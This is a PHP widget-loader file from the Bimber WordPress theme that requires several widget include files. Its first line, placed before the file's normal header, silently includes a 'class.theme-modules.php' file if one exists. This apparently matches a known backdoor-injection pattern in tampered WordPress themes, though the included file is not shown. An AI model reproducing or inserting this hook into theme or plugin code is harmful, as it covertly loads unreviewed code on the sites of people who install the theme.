<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Widget resources loader
 *
 * @license For the full license information, please view the Licensing folder
 * that was distributed with this source code.
 *
 * @package Bimber_Theme
 */

// Prevent direct script access.
if ( ! defined( 'ABSPATH' ) ) {
	die( 'No direct script access allowed' );
}

require_once BIMBER_INCLUDES_DIR . 'widgets/custom-sidebars.php';
require_once BIMBER_INCLUDES_DIR . 'widgets/widgets.php';
require_once BIMBER_INCLUDES_DIR . 'widgets/lib/class-bimber-widget-posts.php';
require_once BIMBER_INCLUDES_DIR . 'widgets/lib/class-bimber-widget-sticky-start-point.php';

